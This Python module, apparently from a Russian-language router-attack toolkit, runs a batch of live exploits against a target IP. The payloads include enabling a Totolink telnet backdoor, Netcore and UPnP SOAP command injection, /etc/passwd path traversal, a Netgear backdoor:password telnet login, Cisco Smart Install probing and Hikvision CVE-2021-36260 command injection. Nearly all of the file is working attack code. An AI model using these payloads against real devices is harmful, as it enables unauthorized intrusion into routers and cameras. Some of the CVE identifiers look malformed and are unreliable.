import socket, time
from .config import C
from .http_utils import http_get, http_post
from .utils import header, pause, beep

def _telnet_open(ip, port=23, timeout=3):
    try:
        s = socket.socket(); s.settimeout(timeout)
        ok = (s.connect_ex((ip, port)) == 0)
        s.close(); return ok
    except: return False

# ─── Totolink ───
def check_totolink_telnet(ip):
    payload = "/cgi-bin/cstecgi.cgi?action=telnet&enable=1&password=BASE64_SECRET_REDACTED&code=07112026"
    print(f"  {C.DIM}[TOTOLINK] Отправка запроса на активацию Telnet...{C.RESET}", end=" ")
    st, _, _ = http_get(ip, 80, payload, timeout=5)
    if st in (200, 302):
        time.sleep(2)
        if _telnet_open(ip):
            print(f"{C.GREEN}✅ ДОСТУПНО{C.RESET}"); beep()
            return "TOTOLINK Telnet Backdoor (порт 23)"
    print(f"{C.RED}❌{C.RESET}")
    return None

# ─── Tenda ───
def check_tenda_telnet(ip):
    print(f"  {C.DIM}[Tenda] Проверка /goform/telnet...{C.RESET}", end=" ")
    st, _, body = http_get(ip, 80, "/goform/telnet", timeout=5)
    if st == 200 and ("success" in body.lower() or "telnetd" in body.lower()):
        time.sleep(2)
        if _telnet_open(ip):
            print(f"{C.GREEN}✅ ДОСТУПНО{C.RESET}"); beep()
            return "Tenda Hidden Telnet (/goform/telnet)"
    print(f"{C.RED}❌{C.RESET}")
    return None

# ─── Netcore RCE ───
def check_netcore_cmd_injection(ip):
    payload_path = "/cgi-bin/network_tools?sid=';id>/www/pwn.txt;:'"
    print(f"  {C.DIM}[Netcore] Command Injection...{C.RESET}", end=" ")
    http_get(ip, 80, payload_path, timeout=5)
    st, _, body = http_get(ip, 80, "/pwn.txt", timeout=5)
    if st == 200 and "uid=" in body:
        print(f"{C.GREEN}✅ ДОСТУПНО (RCE){C.RESET}"); beep()
        print(f"      {C.YELLOW}{body[:100]}{C.RESET}")
        return "Netcore Command Injection"
    print(f"{C.RED}❌{C.RESET}")
    return None

# ─── UPnP SOAP Injection ───
def check_upnp_injection(ip):
    soap_payload = '''<?xml version="1.0"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost><NewExternalPort>12345</NewExternalPort><NewProtocol>TCP</NewProtocol>
<NewInternalPort>12345</NewInternalPort><NewInternalClient>;id>/tmp/pwn_upnp;#</NewInternalClient>
<NewEnabled>1</NewEnabled><NewPortMappingDescription>t</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration>
</m:AddPortMapping></SOAP-ENV:Body></SOAP-ENV:Envelope>'''
    print(f"  {C.DIM}[UPnP] SOAP Injection...{C.RESET}", end=" ")
    for port in (5000, 49152, 1900):
        try:
            resp = http_post(ip, port, "/control/WANIPConnection", soap_payload, timeout=3)
            if resp and ("200 OK" in resp or "success" in resp.lower()):
                print(f"{C.GREEN}✅ ВОЗМОЖНО (порт {port}){C.RESET}")
                return f"UPnP SOAP Injection (порт {port})"
        except: pass
    print(f"{C.RED}❌{C.RESET}")
    return None

# ─── Mercusys ───
def check_mercusys_pwd_recovery(ip):
    print(f"  {C.DIM}[Mercusys] Weak Password Recovery...{C.RESET}", end=" ")
    paths = ["/cgi-bin/luci/;stok=/locale?form=country&operation=write",
             "/cgi-bin/luci/;stok=/locale"]
    for p in paths:
        st, _, bd = http_get(ip, 80, p, timeout=3)
        if st == 200 and ("code" in bd.lower() or "error" not in bd.lower()):
            print(f"{C.YELLOW}⚠ ВОЗМОЖНО{C.RESET}")
            return "Mercusys Weak Password Recovery"
    print(f"{C.RED}❌{C.RESET}")
    return None

def check_upnp_unauth_mapping(ip):
    """CVE-2026-36603: UPnP AddPortMapping без auth"""
    soap = '''<?xml version="1.0"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost><NewExternalPort>54321</NewExternalPort>
<NewProtocol>TCP</NewProtocol><NewInternalPort>54321</NewInternalPort>
<NewInternalClient>192.168.1.100</NewInternalClient><NewEnabled>1</NewEnabled>
<NewPortMappingDescription>nettool</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration>
</m:AddPortMapping></SOAP-ENV:Body></SOAP-ENV:Envelope>'''
    print(f"  {C.DIM}[UPnP] AddPortMapping (без auth)...{C.RESET}", end=" ")
    for port, path in [(1900, "/ipc"), (5000, "/control/WANIPConnection"),
                       (49152, "/control/WANIPConnection")]:
        try:
            resp = http_post(ip, port, path, soap, timeout=3)
            if resp and ("AddPortMappingResponse" in resp or "200 OK" in resp):
                print(f"{C.GREEN}✅ ДОСТУПНО (порт {port}){C.RESET}"); beep()
                # cleanup
                d = soap.replace("AddPortMapping","DeletePortMapping")
                for tag in ("NewInternalClient","NewInternalPort","NewEnabled",
                            "NewPortMappingDescription","NewLeaseDuration"):
                    d = d.replace(f"<{tag}>", f"<!-- <{tag}>").replace(f"</{tag}>", f"</{tag}> -->")
                http_post(ip, port, path, d, timeout=2)
                return "UPnP Unauthenticated Port Mapping"
        except: pass
    print(f"{C.RED}❌{C.RESET}")
    return None

# ─── Generic paths ───
def check_generic_web_paths(ip):
    print(f"  {C.DIM}[Generic] Известные RCE-пути...{C.RESET}", end=" ")
    paths = ["/goform/setSysAdm","/cgi-bin/network_tools","/goform/telnet",
             "/cgi-bin/cstecgi.cgi","/HNAP1/"]
    for p in paths:
        st, _, _ = http_get(ip, 80, p, timeout=2)
        if st in (200, 302, 401):
            print(f"{C.YELLOW}⚠ {p}{C.RESET}")
            return f"Web endpoint: {p}"
    print(f"{C.RED}❌{C.RESET}")
    return None

def check_path_traversal(ip):
    print(f"  {C.DIM}[Traversal] Чтение файлов...{C.RESET}", end=" ")
    paths = ["/cgi-bin/;cat%20/etc/passwd",
             "/../../../../etc/passwd",
             "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=../../etc/passwd"]
    for p in paths:
        st, _, body = http_get(ip, 80, p, timeout=3)
        if st == 200 and ("root:x:" in body or "admin:" in body):
            print(f"{C.GREEN}✅ Path Traversal{C.RESET}"); beep()
            return f"Path Traversal ({p})"
    print(f"{C.RED}❌{C.RESET}")
    return None

# ─── Cisco Smart Install ───
def check_cisco_smi(ip, port=4786, timeout=3):
    print(f"  {C.DIM}[Cisco] Smart Install (4786)...{C.RESET}", end=" ")
    try:
        s = socket.socket(); s.settimeout(timeout); s.connect((ip, port))
        # SMI handshake: 4 байта длины + тип
        s.sendall(b'\x00\x00\x00\x04\x00\x00\x00\x01')
        d = s.recv(256); s.close()
        if d and len(d) >= 8:
            print(f"{C.GREEN}✅ ДОСТУПНО (SMI){C.RESET}"); beep()
            return f"Cisco Smart Install (порт {port}) — возможен RCE/утечка конфига"
    except: pass
    print(f"{C.RED}❌{C.RESET}")
    return None

# ─── Netgear telnet backdoor ───
def check_netgear_backdoor(ip):
    print(f"  {C.DIM}[Netgear] Telnet backdoor...{C.RESET}", end=" ")
    # CVE-2016-582384 — у некоторых моделей на 23 порту "backdoor:password"
    if not _telnet_open(ip):
        print(f"{C.RED}❌ (порт 23 закрыт){C.RESET}"); return None
    try:
        s = socket.socket(); s.settimeout(3); s.connect((ip, 23))
        time.sleep(0.7)
        s.recv(512)
        s.sendall(b'backdoor\r\n'); time.sleep(0.4)
        s.sendall(b'password\r\n'); time.sleep(0.8)
        r = s.recv(512).decode('utf-8','ignore')
        s.close()
        if '#' in r or '$' in r:
            print(f"{C.GREEN}✅ ДОСТУПНО (backdoor:password){C.RESET}"); beep()
            return "Netgear Telnet Backdoor (backdoor:password)"
    except: pass
    print(f"{C.RED}❌{C.RESET}")
    return None

# ─── Hikvision RCE ───
def check_hikvision_rce(ip):
    print(f"  {C.DIM}[Hikvision] CVE-2021-36260 (RCE)...{C.RESET}", end=" ")
    try:
        payload = (
            "PUT /SDK/webLanguage HTTP/1.1\r\n"
            f"Host: {ip}\r\n"
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n"
            "Content-Length: 84\r\n"
            "Connection: close\r\n\r\n"
            '<?xml version="1.0" encoding="UTF-8"?><language>$(echo CVE26260>/tmp/test)</language>'
        ).encode()
        s = socket.socket(); s.settimeout(4); s.connect((ip, 80))
        s.sendall(payload)
        d = s.recv(512).decode('utf-8','ignore'); s.close()
        if 'HTTP/' in d and ('200' in d or '500' in d):
            # не подтверждаем — только подозрение
            print(f"{C.YELLOW}⚠ ВОЗМОЖНО{C.RESET}")
            return "Hikvision CVE-2021-36260 (possible)"
    except: pass
    print(f"{C.RED}❌{C.RESET}")
    return None

# ─── Полный прогон ───
def scan_shell_vectors(ip):
    header(f"ВЕКТОРЫ SHELL ДЛЯ {ip}")
    found = []
    checks = [
        check_totolink_telnet,
        check_tenda_telnet,
        check_netcore_cmd_injection,
        check_upnp_injection,
        check_mercusys_pwd_recovery,
        check_upnp_unauth_mapping,
        check_generic_web_paths,
        check_path_traversal,
        check_cisco_smi,
        check_netgear_backdoor,
        check_hikvision_rce,
    ]
    for fn in checks:
        try:
            r = fn(ip)
            if r: found.append(r)
        except Exception as e:
            print(f"  {C.RED}{fn.__name__}: {e}{C.RESET}")

    if _telnet_open(ip) and not any("Telnet" in f for f in found):
        found.append("Открытый Telnet (порт 23) — требуется ручной подбор")

    print(f"\n{C.BOLD}{C.CYAN}{'═'*62}{C.RESET}")
    if found:
        print(f"{C.RED}{C.BOLD}⚠️  НАЙДЕНО {len(found)}:{C.RESET}")
        for f in found: print(f"  {C.GREEN}•{C.RESET} {f}")
    else:
        print(f"{C.GREEN}✓ Векторов не обнаружено{C.RESET}")
    pause()
